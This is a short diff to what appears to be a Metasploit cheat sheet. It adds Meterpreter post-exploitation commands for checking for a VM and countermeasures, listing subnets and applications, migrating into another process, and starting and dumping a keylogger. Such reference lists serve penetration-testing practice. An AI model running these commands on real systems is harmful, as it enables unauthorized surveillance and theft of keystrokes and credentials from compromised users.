@@ -24,6 +24,15 @@ run
 
 info {Modules Name}
 
-meterpreter > shell
-
 show exploits
+
+meterpreter > shell
+meterpreter > run checkvm
+meterpreter > run getcountermeasure
+meterpreter > run get_local_subnets
+meterpreter > run get_application_list
+meterpreter > ps
+meterpreter > migrate {PID}
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > quit
